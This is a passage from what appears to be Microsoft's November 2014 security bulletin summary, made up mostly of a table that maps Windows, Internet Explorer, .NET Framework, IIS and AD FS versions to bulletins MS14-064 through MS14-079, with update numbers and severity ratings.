|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Server 2008 for 32-bit Systems Service Pack 2|Windows Server 2008 for 32-bit Systems Service Pack 2 (3006226) (Critical) Windows Server 2008 for 32-bit Systems Service Pack 2 (3010788) (Important)|Internet Explorer 7 (3003057) (Moderate) Internet Explorer 8 (3003057) (Moderate) Internet Explorer 9 (3003057) (Moderate)|Windows Server 2008 for 32-bit Systems Service Pack 2 (2992611) (Critical)|Windows Server 2008 for 32-bit Systems Service Pack 2 (2993958) (Important)|Windows Server 2008 for 32-bit Systems Service Pack 2 (3011780) (Critical)|Not applicable|Windows Server 2008 for 32-bit Systems Service Pack 2 (3005607) (Important)|Microsoft .NET Framework 2.0 Service Pack 2 (2978116) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Server 2008 for 32-bit Systems Service Pack 2 (3003743) (Important)|Not applicable|Active Directory Federation Services 2.0 (3003381) (Important)|Windows Server 2008 for 32-bit Systems Service Pack 2 (2991963) (Moderate)|Windows Server 2008 for 32-bit Systems Service Pack 2 (3002885) (Moderate)|
|Windows Server 2008 for x64-based Systems Service Pack 2|Windows Server 2008 for x64-based Systems Service Pack 2 (3006226) (Critical) Windows Server 2008 for x64-based Systems Service Pack 2 (3010788) (Important)|Internet Explorer 7 (3003057) (Moderate) Internet Explorer 8 (3003057) (Moderate) Internet Explorer 9 (3003057) (Moderate)|Windows Server 2008 for x64-based Systems Service Pack 2 (2992611) (Critical)|Windows Server 2008 for x64-based Systems Service Pack 2 (2993958) (Important)|Windows Server 2008 for x64-based Systems Service Pack 2 (3011780) (Critical)|Not applicable|Windows Server 2008 for x64-based Systems Service Pack 2 (3005607) (Important)|Microsoft .NET Framework 2.0 Service Pack 2 (2978116) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Server 2008 for x64-based Systems Service Pack 2 (3003743) (Important)|Not applicable|Active Directory Federation Services 2.0 (3003381) (Important)|Windows Server 2008 for x64-based Systems Service Pack 2 (2991963) (Moderate)|Windows Server 2008 for x64-based Systems Service Pack 2 (3002885) (Moderate)|
|Windows Server 2008 for Itanium-based Systems Service Pack 2|Windows Server 2008 for Itanium-based Systems Service Pack 2 (3006226) (Critical) Windows Server 2008 for Itanium-based Systems Service Pack 2 (3010788) (Important)|Internet Explorer 7 (3003057) (Moderate)|Windows Server 2008 for Itanium-based Systems Service Pack 2 (2992611) (Critical)|Windows Server 2008 for Itanium-based Systems Service Pack 2 (2993958) (Important)|Windows Server 2008 for Itanium-based Systems Service Pack 2 (3011780) (Critical)|Not applicable|Windows Server 2008 for Itanium-based Systems Service Pack 2 (3005607) (Important)|Microsoft .NET Framework 2.0 Service Pack 2 (2978116) (Important) Microsoft .NET Framework 4 (2978125) (Important)|Windows Server 2008 for Itanium-based Systems Service Pack 2 (3003743) (Important)|Not applicable|Not applicable|Windows Server 2008 for Itanium-based Systems Service Pack 2 (2991963) (Moderate)|Windows Server 2008 for Itanium-based Systems Service Pack 2 (3002885) (Moderate)|
|\*\*Windows 7\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows 7 for 32-bit Systems Service Pack 1|Windows 7 for 32-bit Systems Service Pack 1 (3006226) (Critical) Windows 7 for 32-bit Systems Service Pack 1 (3010788) (Important)|Internet Explorer 8 (3003057) (Critical) Internet Explorer 9 (3003057) (Critical) Internet Explorer 10 (3003057) (Critical) Internet Explorer 11 (3003057) (Critical)|Windows 7 for 32-bit Systems Service Pack 1 (2992611) (Critical)|Windows 7 for 32-bit Systems Service Pack 1 (2993958) (Critical)|Windows 7 for 32-bit Systems Service Pack 1 (3011780) (No severity rating)[1]|Not applicable|Windows 7 for 32-bit Systems Service Pack 1 (3005607) (Important)|Microsoft .NET Framework 3.5.1 (2978120) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows 7 for 32-bit Systems Service Pack 1 (3003743) (Important)|Not applicable|Not applicable|Windows 7 for 32-bit Systems Service Pack 1 (2991963) (Moderate)|Windows 7 for 32-bit Systems Service Pack 1 (3002885) (Moderate)|
|Windows 7 for x64-based Systems Service Pack 1|Windows 7 for x64-based Systems Service Pack 1 (3006226) (Critical) Windows 7 for x64-based Systems Service Pack 1 (3010788) (Important)|Internet Explorer 8 (3003057) (Critical) Internet Explorer 9 (3003057) (Critical) Internet Explorer 10 (3003057) (Critical) Internet Explorer 11 (3003057) (Critical)|Windows 7 for x64-based Systems Service Pack 1 (2992611) (Critical)|Windows 7 for x64-based Systems Service Pack 1 (2993958) (Critical)|Windows 7 for x64-based Systems Service Pack 1 (3011780) (No severity rating)[1]|Not applicable|Windows 7 for x64-based Systems Service Pack 1 (3005607) (Important)|Microsoft .NET Framework 3.5.1 (2978120) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows 7 for x64-based Systems Service Pack 1 (3003743) (Important)|Not applicable|Not applicable|Windows 7 for x64-based Systems Service Pack 1 (2991963) (Moderate)|Windows 7 for x64-based Systems Service Pack 1 (3002885) (Moderate)|
|\*\*Windows Server 2008 R2\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Server 2008 R2 for x64-based Systems Service Pack 1|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3006226) (Critical) Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3010788) (Important)|Internet Explorer 8 (3003057) (Moderate) Internet Explorer 9 (3003057) (Moderate) Internet Explorer 10 (3003057) (Moderate) Internet Explorer 11 (3003057) (Moderate)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (2992611) (Critical)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (2993958) (Important)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3011780) (Critical)|Not applicable|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3005607) (Important)|Microsoft .NET Framework 3.5.1 (2978120) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3003743) (Important)|Not applicable|Active Directory Federation Services 2.0 (3003381) (Important)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (2991963) (Moderate)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (3002885) (Moderate)|
|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3006226) (Critical) Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3010788) (Important)|Internet Explorer 8 (3003057) (Moderate)|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (2992611) (Critical)|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (2993958) (Important)|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3011780) (Critical)|Not applicable|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3005607) (Important)|Microsoft .NET Framework 3.5.1 (2978120) (Important) Microsoft .NET Framework 4 (2978125) (Important)|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3003743) (Important)|Not applicable|Not applicable|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (2991963) (Moderate)|Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 (3002885) (Moderate)|
|\*\*Windows 8 and Windows 8.1\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows 8 for 32-bit Systems|Windows 8 for 32-bit Systems (3006226) (Critical) Windows 8 for 32-bit Systems (3010788) (Important)|Internet Explorer 10 (3003057) (Critical)|Windows 8 for 32-bit Systems (2992611) (Critical)|Windows 8 for 32-bit Systems (2993958) (Critical)|Windows 8 for 32-bit Systems (3011780) (No severity rating)[1]|Not applicable|Windows 8 for 32-bit Systems (3005607) (Important)|Microsoft .NET Framework 3.5 (2978121) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978127) (Important)|Windows 8 for 32-bit Systems (3003743) (Important)|Microsoft Internet Information Services 8.0 (2982998) (Important)|Not applicable|Not applicable|Windows 8 for 32-bit Systems (3002885) (Moderate)|
|Windows 8 for x64-based Systems|Windows 8 for x64-based Systems (3006226) (Critical) Windows 8 for x64-based Systems (3010788) (Important)|Internet Explorer 10 (3003057) (Critical)|Windows 8 for x64-based Systems (2992611) (Critical)|Windows 8 for x64-based Systems (2993958) (Critical)|Windows 8 for x64-based Systems (3011780) (No severity rating)[1]|Not applicable|Windows 8 for x64-based Systems (3005607) (Important)|Microsoft .NET Framework 3.5 (2978121) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978127) (Important)|Windows 8 for x64-based Systems (3003743) (Important)|Microsoft Internet Information Services 8.0 (2982998) (Important)|Not applicable|Not applicable|Windows 8 for x64-based Systems (3002885) (Moderate)|
|Windows 8.1 for 32-bit Systems|Windows 8.1 for 32-bit Systems (3006226) (Critical) Windows 8.1 for 32-bit Systems (3010788) (Important)|Internet Explorer 11 (3003057) (Critical)|Windows 8.1 for 32-bit Systems (2992611) (Critical)|Windows 8.1 for 32-bit Systems (2993958) (Critical)|Windows 8.1 for 32-bit Systems (3011780) (No severity rating)[1]|Not applicable|Windows 8.1 for 32-bit Systems (3005607) (Important)|Microsoft .NET Framework 3.5 (2978122) (Important) Microsoft .NET Framework 4.5.1/4.5.2 (2978126) (Important)|Windows 8.1 for 32-bit Systems (3003743) (Important)|Microsoft Internet Information Services 8.5 (2982998) (Important)|Not applicable|Not applicable|Windows 8.1 for 32-bit Systems (3002885) (Moderate)|
|Windows 8.1 for x64-based Systems|Windows 8.1 for x64-based Systems (3006226) (Critical) Windows 8.1 for x64-based Systems (3010788) (Important)|Internet Explorer 11 (3003057) (Critical)|Windows 8.1 for x64-based Systems (2992611) (Critical)|Windows 8.1 for x64-based Systems (2993958) (Critical)|Windows 8.1 for x64-based Systems (3011780) (No severity rating)[1]|Not applicable|Windows 8.1 for x64-based Systems (3005607) (Important)|Microsoft .NET Framework 3.5 (2978122) (Important) Microsoft .NET Framework 4.5.1/4.5.2 (2978126) (Important)|Windows 8.1 for x64-based Systems (3003743) (Important)|Microsoft Internet Information Services 8.5 (2982998) (Important)|Not applicable|Not applicable|Windows 8.1 for x64-based Systems (3002885) (Moderate)|
|\*\*Windows Server 2012 and Windows Server 2012 R2\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Server 2012|Windows Server 2012 (3006226) (Critical) Windows Server 2012 (3010788) (Important)|Internet Explorer 10 (3003057) (Moderate)|Windows Server 2012 (2992611) (Critical)|Windows Server 2012 (2993958) (Important)|Windows Server 2012 (3011780) (Critical)|Not applicable|Windows Server 2012 (3005607) (Important)|Microsoft .NET Framework 3.5 (2978121) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978127) (Important)|Windows Server 2012 (3003743) (Important)|Microsoft Internet Information Services 8.0 (2982998) (Important)|Active Directory Federation Services 2.1 (3003381) (Important)|Not applicable|Windows Server 2012 (3002885) (Moderate)|
|Windows Server 2012 R2|Windows Server 2012 R2 (3006226) (Critical) Windows Server 2012 R2 (3010788) (Important)|Internet Explorer 11 (3003057) (Moderate)|Windows Server 2012 R2 (2992611) (Critical)|Windows Server 2012 R2 (2993958) (Important)|Windows Server 2012 R2 (3011780) (Critical)|Not applicable|Windows Server 2012 R2 (3005607) (Important)|Microsoft .NET Framework 3.5 (2978122) (Important) Microsoft .NET Framework 4.5.1/4.5.2 (2978126) (Important)|Windows Server 2012 R2 (3003743) (Important)|Microsoft Internet Information Services 8.5 (2982998) (Important)|Active Directory Federation Services 3.0 (3003381) (Important)|Not applicable|Windows Server 2012 R2 (3002885) (Moderate)|
|\*\*Windows RT and Windows RT 8.1\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|\*\*None\*\*|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows RT|Windows RT (3006226) (Critical) Windows RT (3010788) (Important)|Internet Explorer 10 (3003057) (Critical)|Windows RT (2992611) (Critical)|Windows RT (2993958) (Critical)|Not applicable|Not applicable|Windows RT (3005607) (Important)|Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978127) (Important)|Windows RT (3003743) (Important)|Not applicable|Not applicable|Not applicable|Windows RT (3002885) (Moderate)|
|Windows RT 8.1|Windows RT 8.1 (3006226) (Critical) Windows RT 8.1 (3010788) (Important)|Internet Explorer 11 (3003057) (Critical)|Windows RT 8.1 (2992611) (Critical)|Windows RT 8.1 (2993958) (Critical)|Not applicable|Not applicable|Windows RT 8.1 (3005607) (Important)|Microsoft .NET Framework 4.5.1/4.5.2 (2978126) (Important)|Windows RT 8.1 (3003743) (Important)|Not applicable|Not applicable|Not applicable|Windows RT 8.1 (3002885) (Moderate)|
|\*\*Server Core installation option\*\*|
|\*\*Bulletin Identifier\*\*|[\*\*MS14-064\*\*](https://go.microsoft.com/fwlink/?linkid=518106)|[\*\*MS14-065\*\*](https://go.microsoft.com/fwlink/?linkid=518103)|[\*\*MS14-066\*\*](https://go.microsoft.com/fwlink/?linkid=518112)|[\*\*MS14-067\*\*](https://go.microsoft.com/fwlink/?linkid=513100)|[\*\*MS14-068\*\*](https://go.microsoft.com/fwlink/?linkid=518109)|[\*\*MS14-070\*\*](https://go.microsoft.com/fwlink/?linkid=507675)|[\*\*MS14-071\*\*](https://go.microsoft.com/fwlink/?linkid=518113)|[\*\*MS14-072\*\*](https://go.microsoft.com/fwlink/?linkid=518107)|[\*\*MS14-074\*\*](https://go.microsoft.com/fwlink/?linkid=518111)|[\*\*MS14-076\*\*](https://go.microsoft.com/fwlink/?linkid=509986)|[\*\*MS14-077\*\*](https://go.microsoft.com/fwlink/?linkid=518108)|[\*\*MS14-078\*\*](https://go.microsoft.com/fwlink/?linkid=509952)|[\*\*MS14-079\*\*](https://go.microsoft.com/fwlink/?linkid=518110)|
|\*\*Aggregate Severity Rating\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Critical\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|\*\*None\*\*|\*\*None\*\*|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Important\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|[\*\*Moderate\*\*](https://go.microsoft.com/fwlink/?linkid=21140)|
|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (3006226) (Critical)|Not applicable|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (2992611) (Critical)|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (2993958) (Important)|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (3011780) (Critical)|Not applicable|Not applicable|Not applicable|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (3003743) (Important)|Not applicable|Not applicable|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (2991963) (Moderate)|Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) (3002885) (Moderate)|
|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (3006226) (Critical)|Not applicable|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (2992611) (Critical)|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (2993958) (Important)|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (3011780) (Critical)|Not applicable|Not applicable|Not applicable|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (3003743) (Important)|Not applicable|Not applicable|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (2991963) (Moderate)|Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) (3002885) (Moderate)|
|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (3006226) (Critical)|Not applicable|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (2992611) (Critical)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (2993958) (Important)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (3011780) (Critical)|Not applicable|Not applicable|Microsoft .NET Framework 3.5.1 (2978120) (Important) Microsoft .NET Framework 4 (2978125) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978128) (Important)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (3003743) (Important)|Not applicable|Not applicable|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (2991963) (Moderate)|Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) (3002885) (Moderate)|
|Windows Server 2012 (Server Core installation)|Windows Server 2012 (Server Core installation) (3006226) (Critical)|Not applicable|Windows Server 2012 (Server Core installation) (2992611) (Critical)|Windows Server 2012 (Server Core installation) (2993958) (Important)|Windows Server 2012 (Server Core installation) (3011780) (Critical)|Not applicable|Not applicable|Microsoft .NET Framework 3.5 (2978121) (Important) Microsoft .NET Framework 4.5/4.5.1/4.5.2 (2978127) (Important)|Windows Server 2012 (Server Core installation) (3003743) (Important)|Windows Server 2012 (Server Core installation) (2982998) (Important)|Not applicable|Not applicable|Windows Server 2012 (Server Core installation) (3002885) (Moderate)|
|Windows Server 2012 R2 (Server Core installation)|Windows Server 2012 R2 (Server Core installation) (3006226) (Critical)|Not applicable|Windows Server 2012 R2 (Server Core installation) (2992611) (Critical)|Windows Server 2012 R2 (Server Core installation) (2993958) (Important)|Windows Server 2012 R2 (Server Core installation) (3011780) (Critical)|Not applicable|Not applicable|Microsoft .NET Framework 3.5 (2978122) (Important) Microsoft .NET Framework 4.5.1/4.5.2 (2978126) (Important)|Windows Server 2012 R2 (Server Core installation) (3003743) (Important)|Windows Server 2012 R2 (Server Core installation (2982998) (Important)|Active Directory Federation Services 3.0 (3003381) (Important)|Not applicable|Windows Server 2012 R2 (Server Core installation) (3002885) (Moderate)|

**Note for MS14-064, MS14-065, and MS14-067**

Windows Technical Preview and Windows Server Technical Preview are affected. Customers running these operating systems are encouraged to apply the update, which is available via [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130).

**Notes for MS14-068**

Windows Technical Preview and Windows Server Technical Preview are affected. Customers running these operating systems are encouraged to apply the update, which is available via [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130).

[1]Severity ratings do not apply for this operating system because the vulnerability addressed in this bulletin is not present. This update provides additional [defense-in-depth](https://technet.microsoft.com/en-us/library/security/dn848375.aspx) hardening that does not fix any known vulnerability.

**Note for MS14-078**

This bulletin spans more than one software category. See the other tables in this section for additional affected software.

### Microsoft Office Suites and Software

| **Microsoft Office 2007** |  |  |
| --- | --- | --- |
| **Bulletin Identifier** | [**MS14-069**](https://go.microsoft.com/fwlink/?linkid=518105) | [**MS14-078**](https://go.microsoft.com/fwlink/?linkid=509952) |
